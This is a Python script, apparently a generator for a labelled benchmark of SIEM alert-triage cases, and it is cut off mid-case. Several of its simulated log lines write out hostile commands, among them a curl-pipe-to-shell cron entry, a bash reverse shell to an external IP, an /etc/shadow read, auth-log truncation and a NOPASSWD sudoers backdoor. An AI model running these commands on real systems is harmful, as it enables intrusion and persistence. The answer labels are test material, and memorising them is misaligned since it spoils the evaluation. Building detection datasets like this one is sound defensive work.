import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).parent
BASE = datetime(2026, 8, 18, 0, 0, 0, tzinfo=timezone.utc)

CASES: list[dict] = []


def case(name: str, host: str, offset_hours: float, label: dict, alerts: list[tuple]) -> None:
    CASES.append(
        {
            "name": name,
            "host": host,
            "start": BASE + timedelta(hours=offset_hours),
            "label": label,
            "alerts": alerts,
        }
    )


def label(verdict, escalate, severity, techniques, note):
    return {
        "verdict": verdict,
        "escalate": escalate,
        "severity": severity,
        "techniques": techniques,
        "note": note,
    }


case(
    "bruteforce_success", "web01", 2.23,
    label("true_positive", True, "high", ["T1110.001", "T1078", "T1136.001", "T1548.003"],
          "Password guessing from one public address ends in a successful login and immediate account creation."),
    [
        (0, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.45", "srcuser": "admin"},
         "Aug 18 02:14:03 web01 sshd[2201]: Failed password for invalid user admin from 203.0.113.45 port 51002 ssh2"),
        (9, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.45", "srcuser": "oracle"},
         "Aug 18 02:14:12 web01 sshd[2203]: Failed password for invalid user oracle from 203.0.113.45 port 51006 ssh2"),
        (7, "5712", 10, "sshd: brute force trying to get access to the system. Non existent user.",
         ["syslog", "sshd", "authentication_failures"], ["T1110.001"],
         {"srcip": "203.0.113.45"},
         "Aug 18 02:14:19 web01 sshd[2205]: Failed password for invalid user test from 203.0.113.45 port 51011 ssh2"),
        (48, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1078"],
         {"srcip": "203.0.113.45", "srcuser": "backup"},
         "Aug 18 02:15:07 web01 sshd[2240]: Accepted password for backup from 203.0.113.45 port 51044 ssh2"),
        (31, "5402", 3, "Successful sudo to ROOT executed",
         ["syslog", "sudo"], ["T1548.003"],
         {"srcuser": "backup", "process": "/bin/bash"},
         "Aug 18 02:15:38 web01 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash"),
        (44, "5902", 8, "New user added to the system",
         ["syslog", "adduser", "account_changed"], ["T1136.001"],
         {"srcuser": "backup"},
         "Aug 18 02:16:22 web01 useradd[2261]: new user: name=svc_update, UID=0, GID=0, home=/home/svc_update, shell=/bin/bash"),
    ],
)

case(
    "webshell", "web01", 6.5,
    label("true_positive", True, "high", ["T1190", "T1505.003"],
          "Scanner enumeration followed by a 200 on an uploaded PHP path carrying a command parameter."),
    [
        (0, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:00 +0000] "GET /wp-login.php HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (3, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:03 +0000] "GET /.env HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (4, "31151", 10, "Multiple web server 400 error codes from same source ip.",
         ["web", "accesslog", "web_scan", "recon"], ["T1190"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:07 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (66, "31108", 6, "PHP file uploaded to a writable directory.",
         ["web", "accesslog", "attack"], ["T1505.003"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:31:13 +0000] "POST /uploads/thumb.php HTTP/1.1" 200 42 "-" "curl/8.5.0"'),
        (22, "31103", 12, "SQL injection or command execution attempt in URL.",
         ["web", "accesslog", "attack", "sql_injection"], ["T1505.003"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:31:35 +0000] "GET /uploads/thumb.php?cmd=id HTTP/1.1" 200 31 "-" "curl/8.5.0"'),
    ],
)

case(
    "cron_persistence", "web01", 9.1,
    label("true_positive", True, "high", ["T1053.003", "T1105", "T1059.004"],
          "A service account rewrites its crontab to pull a remote script and pipe it to a shell."),
    [
        (0, "2833", 8, "Crontab entry modified.", ["syslog", "cron", "config_changed"], ["T1053.003"],
         {"srcuser": "svc_update"},
         "Aug 18 09:06:00 web01 crontab[7781]: (svc_update) REPLACE (svc_update)"),
        (41, "533", 10, "Suspicious command executed from a scheduled task.",
         ["syslog", "cron"], ["T1105"],
         {"srcuser": "svc_update"},
         "Aug 18 09:06:41 web01 CRON[7802]: (svc_update) CMD (curl -s http://198.18.7.9/p.sh | sh)"),
    ],
)

case(
    "exfil_staging", "db01", 13.75,
    label("true_positive", True, "critical", ["T1074.001", "T1048"],
          "Bulk archive written to /tmp on the customer database, then pushed outbound to a public address."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], ["T1074.001"],
         {"process": "/tmp/.cache/db_dump.tar.gz"},
         "Aug 18 13:45:00 db01 ossec: File '/tmp/.cache/db_dump.tar.gz' added to the file system."),
        (95, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "appsvc", "process": "/usr/bin/mysqldump"},
         "Aug 18 13:46:35 db01 sudo: appsvc : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases"),
        (120, "31530", 12, "Large outbound transfer to an external address.",
         ["firewall", "network"], ["T1048"],
         {"srcip": "45.61.184.12"},
         "Aug 18 13:48:35 db01 kernel: OUT=eth0 DST=45.61.184.12 PROTO=TCP DPT=443 LEN=1420 BYTES=2118934012"),
    ],
)

case(
    "lateral_ssh", "db01", 16.4,
    label("true_positive", True, "high", ["T1021.004", "T1098.004"],
          "New authorized key on the database host followed by a key-based login from the web tier."),
    [
        (0, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], ["T1098.004"],
         {"process": "/home/appsvc/.ssh/authorized_keys"},
         "Aug 18 16:24:00 db01 ossec: Integrity checksum changed for: '/home/appsvc/.ssh/authorized_keys'"),
        (74, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1021.004"],
         {"srcip": "10.10.2.15", "srcuser": "appsvc"},
         "Aug 18 16:25:14 db01 sshd[8812]: Accepted publickey for appsvc from 10.10.2.15 port 44120 ssh2: RSA SHA256:Xk9"),
    ],
)

case(
    "pkexec_privesc", "app02", 19.2,
    label("true_positive", True, "high", ["T1548.001"],
          "Unprivileged web account fails sudo, then crashes a setuid helper in the way CVE-2021-4034 does."),
    [
        (0, "5401", 5, "Failed attempt to run sudo", ["syslog", "sudo"], [],
         {"srcuser": "www-data"},
         "Aug 18 19:12:00 app02 sudo: www-data : user NOT in sudoers ; TTY=pts/3 ; PWD=/var/www ; USER=root ; COMMAND=/bin/sh"),
        (37, "5104", 12, "Suspicious kernel trap raised by a setuid binary.",
         ["syslog", "kernel"], ["T1548.001"],
         {"srcuser": "www-data", "process": "/usr/bin/pkexec"},
         "Aug 18 19:12:37 app02 kernel: traps: pkexec[4471] trap invalid opcode ip:7f1 sp:7ff error:0 in libc.so.6"),
    ],
)

case(
    "apt_upgrade_fim", "app02", 4.0,
    label("false_positive", False, "informational", [],
          "A burst of integrity changes confined to package-managed paths during a scheduled upgrade window."),
    [
        (0, "2902", 3, "New dpkg (Debian Package) installed.",
         ["syslog", "dpkg", "config_changed"], [], {},
         "Aug 18 04:00:00 app02 dpkg: status installed libssl3:amd64 3.0.13-1"),
        (6, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/bin/openssl"},
         "Aug 18 04:00:06 app02 ossec: Integrity checksum changed for: '/usr/bin/openssl'"),
        (4, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/lib/x86_64-linux-gnu/libssl.so.3"},
         "Aug 18 04:00:10 app02 ossec: Integrity checksum changed for: '/usr/lib/x86_64-linux-gnu/libssl.so.3'"),
        (5, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/bin/c_rehash"},
         "Aug 18 04:00:15 app02 ossec: Integrity checksum changed for: '/usr/bin/c_rehash'"),
    ],
)

case(
    "admin_maintenance", "app02", 10.5,
    label("false_positive", False, "informational", [],
          "Named administrator on an internal address running a package upgrade during working hours."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], [],
         {"srcip": "10.10.4.22", "srcuser": "natali"},
         "Aug 18 10:30:00 app02 sshd[4102]: Accepted publickey for natali from 10.10.4.22 port 49221 ssh2: RSA SHA256:9Qk"),
        (25, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "natali", "process": "/usr/bin/apt-get"},
         "Aug 18 10:30:25 app02 sudo: natali : TTY=pts/0 ; PWD=/home/natali ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y"),
    ],
)

case(
    "internet_noise", "web01", 21.6,
    label("false_positive", False, "low", [],
          "Untargeted credential guessing from scattered addresses against an internet-facing host, none successful."),
    [
        (0, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "198.51.100.14", "srcuser": "root"},
         "Aug 18 21:36:00 web01 sshd[3301]: Failed password for invalid user root from 198.51.100.14 port 40122 ssh2"),
        (120, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.201", "srcuser": "pi"},
         "Aug 18 21:38:00 web01 sshd[3320]: Failed password for invalid user pi from 203.0.113.201 port 41880 ssh2"),
        (180, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "192.0.2.66", "srcuser": "admin"},
         "Aug 18 21:41:00 web01 sshd[3355]: Failed password for invalid user admin from 192.0.2.66 port 55010 ssh2"),
    ],
)

case(
    "backup_failure", "db01", 3.5,
    label("false_positive", False, "informational", [],
          "A backup job failing the same way it fails every night. An operational fault, not a security event."),
    [
        (0, "1002", 2, "Unknown problem somewhere in the system.", ["syslog", "errors"], [], {},
         "Aug 18 03:30:00 db01 backup.sh[3311]: rsync: connection unexpectedly closed (0 bytes received)"),
        (2, "1002", 2, "Unknown problem somewhere in the system.", ["syslog", "errors"], [], {},
         "Aug 18 03:30:02 db01 backup.sh[3311]: error: backup run failed with status 12"),
    ],
)

case(
    "scanner_404s", "web01", 11.9,
    label("false_positive", False, "low", [],
          "Commodity scanner sweeping known paths. Every response is a 404 and nothing follows."),
    [
        (0, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:00 +0000] "GET /vendor/phpunit/eval-stdin.php HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
        (2, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:02 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
        (3, "31151", 10, "Multiple web server 400 error codes from same source ip.",
         ["web", "accesslog", "web_scan", "recon"], ["T1190"],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:05 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
    ],
)

case(
    "build_churn", "build01", 14.25,
    label("false_positive", False, "informational", [],
          "Continuous integration workspace churn on a host whose entire job is creating and deleting files."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/jenkins/workspace/api/target/api.jar"},
         "Aug 18 14:15:00 build01 ossec: File '/var/lib/jenkins/workspace/api/target/api.jar' added to the file system."),
        (11, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/jenkins/workspace/api/target/classes/App.class"},
         "Aug 18 14:15:11 build01 ossec: File '/var/lib/jenkins/workspace/api/target/classes/App.class' added to the file system."),
        (9, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/var/lib/jenkins/workspace/api/pom.xml"},
         "Aug 18 14:15:20 build01 ossec: Integrity checksum changed for: '/var/lib/jenkins/workspace/api/pom.xml'"),
    ],
)

case(
    "offhours_login", "app02", 1.05,
    label("inconclusive", True, "medium", ["T1078"],
          "A real account authenticating from an unfamiliar public address at 01:03, with nothing before or after it."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1078"],
         {"srcip": "91.203.144.8", "srcuser": "dmitri"},
         "Aug 18 01:03:00 app02 sshd[1180]: Accepted password for dmitri from 91.203.144.8 port 39221 ssh2"),
    ],
)

case(
    "offhours_useradd", "build01", 2.05,
    label("inconclusive", True, "medium", ["T1136.001"],
          "Account creation at 02:03 with no session, no sudo, and no provisioning context in the data."),
    [
        (0, "5902", 8, "New user added to the system",
         ["syslog", "adduser", "account_changed"], ["T1136.001"], {},
         "Aug 18 02:03:00 build01 useradd[6610]: new user: name=ci_runner2, UID=1005, GID=1005, home=/home/ci_runner2, shell=/bin/bash"),
    ],
)


# ---- corpus expansion: 26 additional cases (see README "Limits") ----

case(
    "reverse_shell", "app02", 20.4,
    label("true_positive", True, "high", ["T1059.004", "T1071.001"],
          "A web service account spawns bash with a network redirection to an external host."),
    [
        (0, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "www-data"},
         "Aug 18 20:24:00 app02 sudo: www-data : TTY=pts/4 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"),
        (12, "100200", 12, "Reverse shell detected: shell with network redirection.",
         ["audit", "command", "attack"], ["T1059.004"],
         {"srcuser": "www-data", "process": "/bin/bash"},
         "Aug 18 20:24:12 app02 audit: bash -i >& /dev/tcp/45.61.184.12/4444 0>&1"),
        (30, "31530", 12, "Large outbound transfer to an external address.",
         ["firewall", "network"], ["T1071.001"],
         {"srcip": "45.61.184.12"},
         "Aug 18 20:24:42 app02 kernel: OUT=eth0 DST=45.61.184.12 PROTO=TCP DPT=4444 LEN=1420"),
    ],
)

case(
    "shadow_read", "dc01", 3.2,
    label("true_positive", True, "critical", ["T1003.008"],
          "A non-root service account reads /etc/shadow on the domain controller."),
    [
        (0, "5401", 5, "Failed attempt to run sudo", ["syslog", "sudo"], [],
         {"srcuser": "ldapsvc"},
         "Aug 18 03:12:00 dc01 sudo: ldapsvc : user NOT in sudoers ; COMMAND=/bin/cat /etc/shadow"),
        (18, "100300", 12, "Sensitive credential file accessed by unexpected user.",
         ["audit", "attack"], ["T1003.008"],
         {"srcuser": "ldapsvc", "process": "/bin/cat"},
         "Aug 18 03:12:18 dc01 audit: type=PATH name=/etc/shadow uid=ldapsvc access=read"),
    ],
)

case(
    "log_tamper", "web01", 22.7,
    label("true_positive", True, "high", ["T1070.002"],
          "Authentication logs are truncated shortly after a privileged session, hiding activity."),
    [
        (0, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "svc_update"},
         "Aug 18 22:42:00 web01 sudo: svc_update : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log"),
        (5, "592", 9, "Log file size reduced, log was cleared.",
         ["ossec", "syscheck"], ["T1070.002"],
         {"process": "/var/log/auth.log"},
         "Aug 18 22:42:05 web01 ossec: Log file '/var/log/auth.log' was cleared or reduced in size."),
    ],
)

case(
    "payload_download_exec", "app02", 7.8,
    label("true_positive", True, "high", ["T1105", "T1204.002"],
          "A remote binary is fetched to /tmp, made executable, and run within seconds."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], ["T1105"],
         {"process": "/tmp/.x/kworker"},
         "Aug 18 07:48:00 app02 ossec: File '/tmp/.x/kworker' added to the file system."),
        (8, "100400", 10, "Downloaded file made executable and run from a temp directory.",
         ["audit", "command", "attack"], ["T1204.002"],
         {"process": "/tmp/.x/kworker"},
         "Aug 18 07:48:08 app02 audit: chmod +x /tmp/.x/kworker && /tmp/.x/kworker"),
    ],
)

case(
    "systemd_persistence", "db01", 11.3,
    label("true_positive", True, "high", ["T1543.002"],
          "A new systemd service unit is written that launches a script from /tmp on boot."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], ["T1543.002"],
         {"process": "/etc/systemd/system/updater.service"},
         "Aug 18 11:18:00 db01 ossec: File '/etc/systemd/system/updater.service' added to the file system."),
        (14, "2501", 8, "systemd unit enabled.", ["syslog", "systemd"], ["T1543.002"],
         {"srcuser": "appsvc"},
         "Aug 18 11:18:14 db01 systemd[1]: Reloading. Enabled updater.service -> /tmp/.boot.sh"),
    ],
)

case(
    "dns_tunnel", "app02", 15.9,
    label("true_positive", True, "high", ["T1048.003"],
          "Sustained high-volume TXT lookups to a single external domain, consistent with DNS tunnelling."),
    [
        (0, "100500", 10, "Excessive DNS TXT queries to a single domain.",
         ["firewall", "dns", "attack"], ["T1048.003"],
         {"srcip": "10.10.4.30"},
         "Aug 18 15:54:00 app02 named: 4192 TXT queries to data.exfil-c2.net in 60s from 10.10.4.30"),
        (65, "100501", 8, "DNS query volume anomaly sustained.",
         ["firewall", "dns"], ["T1048.003"],
         {"srcip": "10.10.4.30"},
         "Aug 18 15:55:05 app02 named: TXT query rate still elevated to data.exfil-c2.net"),
    ],
)

case(
    "mass_encrypt", "db01", 5.6,
    label("true_positive", True, "critical", ["T1486"],
          "Thousands of files renamed with a new extension in minutes on the database host."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], ["T1486"],
         {"process": "/var/lib/mysql/ibdata1.LOCKED"},
         "Aug 18 05:36:00 db01 ossec: File '/var/lib/mysql/ibdata1.LOCKED' added to the file system."),
        (3, "553", 7, "File deleted.", ["ossec", "syscheck"], ["T1486"],
         {"process": "/var/lib/mysql/ibdata1"},
         "Aug 18 05:36:03 db01 ossec: File '/var/lib/mysql/ibdata1' was deleted."),
        (9, "100600", 13, "Mass file rename to a uniform extension detected.",
         ["ossec", "syscheck", "attack"], ["T1486"],
         {},
         "Aug 18 05:36:12 db01 ossec: 3841 files renamed to *.LOCKED under /var/lib/mysql in 40s"),
    ],
)

case(
    "vpn_bruteforce_success", "vpn01", 0.4,
    label("true_positive", True, "high", ["T1110.001", "T1133"],
          "A run of failed VPN authentications from one address ends in a success at 00:24."),
    [
        (0, "100700", 5, "VPN authentication failure.", ["openvpn", "authentication_failed"], ["T1110.001"],
         {"srcip": "91.203.144.8", "srcuser": "jsmith"},
         "Aug 18 00:24:00 vpn01 openvpn: AUTH_FAILED user=jsmith from 91.203.144.8"),
        (11, "100700", 5, "VPN authentication failure.", ["openvpn", "authentication_failed"], ["T1110.001"],
         {"srcip": "91.203.144.8", "srcuser": "jsmith"},
         "Aug 18 00:24:11 vpn01 openvpn: AUTH_FAILED user=jsmith from 91.203.144.8"),
        (9, "100710", 10, "Multiple VPN authentication failures from one source.",
         ["openvpn", "authentication_failures"], ["T1110.001"],
         {"srcip": "91.203.144.8"},
         "Aug 18 00:24:20 vpn01 openvpn: repeated AUTH_FAILED from 91.203.144.8"),
        (40, "100720", 8, "VPN authentication success.", ["openvpn", "authentication_success"], ["T1133"],
         {"srcip": "91.203.144.8", "srcuser": "jsmith"},
         "Aug 18 00:25:00 vpn01 openvpn: AUTH_SUCCESS user=jsmith from 91.203.144.8"),
    ],
)

case(
    "mail_relay_abuse", "mail01", 17.1,
    label("true_positive", True, "medium", ["T1114.002"],
          "An authenticated account sends thousands of messages to external recipients in minutes."),
    [
        (0, "100800", 8, "Outbound mail volume spike from a single account.",
         ["postfix", "mail"], ["T1114.002"],
         {"srcuser": "marketing"},
         "Aug 18 17:06:00 mail01 postfix/smtp: 2210 messages sent by marketing to external domains in 5m"),
        (70, "100801", 6, "Mail account sending to many unique recipients.",
         ["postfix", "mail"], ["T1114.002"],
         {"srcuser": "marketing"},
         "Aug 18 17:07:10 mail01 postfix/smtp: marketing -> 2190 distinct external recipients"),
    ],
)

case(
    "sudoers_backdoor", "web01", 12.9,
    label("true_positive", True, "high", ["T1548.003", "T1136.001"],
          "A NOPASSWD entry for a freshly created account is written into /etc/sudoers.d."),
    [
        (0, "5902", 8, "New user added to the system", ["syslog", "adduser", "account_changed"], ["T1136.001"],
         {"srcuser": "svc_update"},
         "Aug 18 12:54:00 web01 useradd[7120]: new user: name=support, UID=1099, home=/home/support"),
        (20, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], ["T1548.003"],
         {"process": "/etc/sudoers.d/support"},
         "Aug 18 12:54:20 web01 ossec: File '/etc/sudoers.d/support' changed: support ALL=(ALL) NOPASSWD:ALL"),
    ],
)

case(
    "certbot_renewal", "web01", 4.7,
    label("false_positive", False, "informational", [],
          "Certificate files change under /etc/letsencrypt during the scheduled renewal window."),
    [
        (0, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/etc/letsencrypt/live/web01/fullchain.pem"},
         "Aug 18 04:42:00 web01 ossec: Integrity checksum changed for '/etc/letsencrypt/live/web01/fullchain.pem'"),
        (2, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/etc/letsencrypt/live/web01/privkey.pem"},
         "Aug 18 04:42:02 web01 ossec: Integrity checksum changed for '/etc/letsencrypt/live/web01/privkey.pem'"),
        (3, "2501", 3, "systemd unit completed.", ["syslog", "systemd"], [], {},
         "Aug 18 04:42:05 web01 systemd[1]: certbot.service: Succeeded."),
    ],
)

case(
    "logrotate", "app02", 0.05,
    label("false_positive", False, "informational", [],
          "Log files rotate and shrink at 00:03; the size reduction is logrotate, not tampering."),
    [
        (0, "592", 9, "Log file size reduced, log was cleared.",
         ["ossec", "syscheck"], [],
         {"process": "/var/log/syslog"},
         "Aug 18 00:03:00 app02 ossec: Log file '/var/log/syslog' was reduced in size."),
        (1, "2501", 3, "systemd unit completed.", ["syslog", "systemd"], [], {},
         "Aug 18 00:03:01 app02 systemd[1]: logrotate.service: Succeeded."),
    ],
)

case(
    "apt_remove", "app02", 6.2,
    label("false_positive", False, "informational", [],
          "A package is removed and its files deleted during a scheduled maintenance window."),
    [
        (0, "2904", 3, "Dpkg (Debian Package) removed.", ["syslog", "dpkg", "config_changed"], [], {},
         "Aug 18 06:12:00 app02 dpkg: status half-installed nano:amd64 removed"),
        (4, "553", 7, "File deleted.", ["ossec", "syscheck"], [],
         {"process": "/usr/bin/nano"},
         "Aug 18 06:12:04 app02 ossec: File '/usr/bin/nano' was deleted."),
    ],
)

case(
    "ansible_run", "db01", 10.9,
    label("false_positive", False, "informational", [],
          "Config management pushes a batch of file changes from the automation host during business hours."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], [],
         {"srcip": "10.10.1.9", "srcuser": "ansible"},
         "Aug 18 10:54:00 db01 sshd[5210]: Accepted publickey for ansible from 10.10.1.9 port 40122 ssh2"),
        (6, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/etc/mysql/my.cnf"},
         "Aug 18 10:54:06 db01 ossec: Integrity checksum changed for '/etc/mysql/my.cnf'"),
        (4, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/etc/security/limits.conf"},
         "Aug 18 10:54:10 db01 ossec: Integrity checksum changed for '/etc/security/limits.conf'"),
    ],
)

case(
    "dev_git_push", "ci02", 14.6,
    label("false_positive", False, "informational", [],
          "A developer on the office network authenticates and runs git operations on the build host."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], [],
         {"srcip": "10.10.4.51", "srcuser": "dev_arben"},
         "Aug 18 14:36:00 ci02 sshd[6110]: Accepted publickey for dev_arben from 10.10.4.51 port 55201 ssh2"),
        (30, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/home/dev_arben/project/.git/ORIG_HEAD"},
         "Aug 18 14:36:30 ci02 ossec: File '/home/dev_arben/project/.git/ORIG_HEAD' added to the file system."),
    ],
)

case(
    "backup_cron_ok", "db01", 3.0,
    label("false_positive", False, "informational", [],
          "The nightly backup job runs, writes an archive, and exits zero. Expected operations."),
    [
        (0, "2501", 3, "cron job executed.", ["syslog", "cron"], [], {},
         "Aug 18 03:00:00 db01 CRON[3110]: (root) CMD (/usr/local/bin/backup.sh)"),
        (40, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/backup/db-2026-08-18.tar.gz"},
         "Aug 18 03:00:40 db01 ossec: File '/backup/db-2026-08-18.tar.gz' added to the file system."),
    ],
)

case(
    "docker_pull", "ci02", 14.9,
    label("false_positive", False, "informational", [],
          "Image layers are written under /var/lib/docker during a normal build pull."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/docker/overlay2/a1b2/diff/app.jar"},
         "Aug 18 14:54:00 ci02 ossec: File '/var/lib/docker/overlay2/a1b2/diff/app.jar' added."),
        (7, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/docker/overlay2/c3d4/diff/lib.so"},
         "Aug 18 14:54:07 ci02 ossec: File '/var/lib/docker/overlay2/c3d4/diff/lib.so' added."),
    ],
)

case(
    "kernel_upgrade", "app02", 4.3,
    label("false_positive", False, "informational", [],
          "Boot files change during a kernel package upgrade, alongside the dpkg record that explains them."),
    [
        (0, "2902", 3, "New dpkg (Debian Package) installed.",
         ["syslog", "dpkg", "config_changed"], [], {},
         "Aug 18 04:18:00 app02 dpkg: status installed linux-image-5.15.0-91:amd64"),
        (8, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/boot/vmlinuz-5.15.0-91"},
         "Aug 18 04:18:08 app02 ossec: Integrity checksum changed for '/boot/vmlinuz-5.15.0-91'"),
        (5, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/boot/initrd.img-5.15.0-91"},
         "Aug 18 04:18:13 app02 ossec: Integrity checksum changed for '/boot/initrd.img-5.15.0-91'"),
    ],
)

case(
    "service_crashloop", "mail01", 8.9,
    label("false_positive", False, "low", [],
          "A mail service crashes and is restarted repeatedly. An availability fault, not an attacker."),
    [
        (0, "2501", 4, "Service entered failed state.", ["syslog", "systemd"], [], {},
         "Aug 18 08:54:00 mail01 systemd[1]: dovecot.service: Main process exited, status=1/FAILURE"),
        (30, "2501", 4, "Service entered failed state.", ["syslog", "systemd"], [], {},
         "Aug 18 08:54:30 mail01 systemd[1]: dovecot.service: Failed with result 'exit-code'."),
        (30, "2501", 4, "Service entered failed state.", ["syslog", "systemd"], [], {},
         "Aug 18 08:55:00 mail01 systemd[1]: dovecot.service: Scheduled restart, attempt 3."),
    ],
)

case(
    "monitoring_probe", "web01", 13.4,
    label("false_positive", False, "low", [],
          "A monitoring system health-checks an endpoint on a fixed interval from the internal poller."),
    [
        (0, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "10.10.1.20", "url": "/healthz"},
         '10.10.1.20 - - [18/Aug/2026:13:24:00 +0000] "GET /healthz HTTP/1.1" 404 12 "-" "Datadog/agent"'),
        (60, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "10.10.1.20", "url": "/healthz"},
         '10.10.1.20 - - [18/Aug/2026:13:25:00 +0000] "GET /healthz HTTP/1.1" 404 12 "-" "Datadog/agent"'),
    ],
)

case(
    "offhours_dbdump", "db01", 2.6,
    label("inconclusive", True, "medium", ["T1005"],
          "A full database dump runs at 02:36 by a service account with no scheduled job visible for it."),
    [
        (0, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], ["T1005"],
         {"srcuser": "reportsvc", "process": "/usr/bin/mysqldump"},
         "Aug 18 02:36:00 db01 sudo: reportsvc : USER=root ; COMMAND=/usr/bin/mysqldump --all-databases"),
    ],
)

case(
    "sudo_group_add", "app02", 18.7,
    label("inconclusive", True, "medium", ["T1098"],
          "An existing account is added to the sudo group with no change ticket or session context in the data."),
    [
        (0, "5904", 8, "User added to a privileged group.",
         ["syslog", "account_changed"], ["T1098"],
         {"srcuser": "contractor7"},
         "Aug 18 18:42:00 app02 usermod[8010]: add 'contractor7' to group 'sudo'"),
    ],
)

case(
    "new_geo_login", "vpn01", 5.3,
    label("inconclusive", True, "medium", ["T1078"],
          "A valid account authenticates from a country it has never connected from before, nothing else attached."),
    [
        (0, "100720", 8, "VPN authentication success.",
         ["openvpn", "authentication_success"], ["T1078"],
         {"srcip": "203.0.113.240", "srcuser": "kpeters"},
         "Aug 18 05:18:00 vpn01 openvpn: AUTH_SUCCESS user=kpeters from 203.0.113.240 geo=SG"),
    ],
)

case(
    "single_binary_change", "app02", 9.7,
    label("inconclusive", True, "medium", ["T1554"],
